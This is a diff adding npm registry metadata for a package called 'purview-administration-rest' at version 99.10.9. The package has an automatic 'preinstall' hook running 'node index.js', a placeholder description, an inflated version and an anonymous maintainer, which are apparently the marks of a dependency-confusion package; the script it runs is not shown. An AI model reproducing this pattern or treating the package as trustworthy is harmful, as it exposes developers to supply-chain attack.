@@ -1,0 +1,62 @@
+{
+    "_id": "purview-administration-rest",
+    "name": "purview-administration-rest",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "purview-administration-rest",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "purview-administration-rest@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-M/k+sbsCZ+bPYhVCA4icv6CB1Z5vjIXJRxXYfBrqoZShxw63jNXjx5dSstpAZRM1FLjvaySp2RHothvNF6DUPQ==",
+                "shasum": "92ee203296393b5dd57ade50bac742d6a5ce0241",
+                "tarball": "https://registry.npmjs.org/purview-administration-rest/-/purview-administration-rest-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5079,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPIhLACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmr+WQ/+Oh7Qr3avwj3H1urpNFjhSgRyKRErgkrAQ8GcUjSuDxDv0Lqz\r\nwUvWsuVcMSiE15/Dmh5MVzD3FJMy8Vy4TJKipwsdqRi8lGjOsmkv3U4CuCs6\r\ncTzWKemU4R5wZHFK3cai5xPZm+reiiage8RH47mCPPXQLj+UydNVF1XuEg3w\r\nfpthjW7MOsXc9bOqjZNtGKOTOvHUqBK9NFeeH8B8MS4ITSsF0BuQ2466XKZj\r\n1yKgLpt5wQfgqJ/pcc656fBRKZiSMxYSM4Zrw8uYem1oUkcKb7UnsFYOYAqT\r\n14kPw69KQxqr334+2PYQ9ASYFr4Mbw7Z8uC8yaOVyR/LOMpch2U9UYbaSO+3\r\nuCRdOYd91+/fAKien2Mw0QIKcuqOjkIn3Lm/z6k4OeUDqTXkVFABrw0LOLhA\r\nqWoOjaK/AHbu/OCykWAI06rTFDQAT8LhD1NF38esCFk3PDTxUIuDU79a7cc+\r\nWxNRc5512QhxBNidJQrUWcQRHu3ZPDfriUyQ/mM1K7Bg7UlR9sBiAudd13Cp\r\n1/38Orr/qHnT/Y++VubhXiQjxJZ81xDoO7TemWIAFLEIDiCHyZyBYDzAV5MJ\r\nlJfFGk7RVyBcxmvyfZLIXKYn6AjOINYJ17FomQCgDSLD948FadAItqAgqgCF\r\n3E9cp7uZsGwHCu62QxE8AZSMdXN19auCDcg=\r\n=6TjB\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "mt30v341",
+                "email": "mt30v341@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "mt30v341",
+                    "email": "mt30v341@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/purview-administration-rest_99.10.9_1648134219678_0.5606538091534135"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T15:03:39.677Z",
+        "99.10.9": "2022-03-24T15:03:39.822Z",
+        "modified": "2022-03-24T15:03:39.969Z"
+    },
+    "maintainers": [
+        {
+            "name": "mt30v341",
+            "email": "mt30v341@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
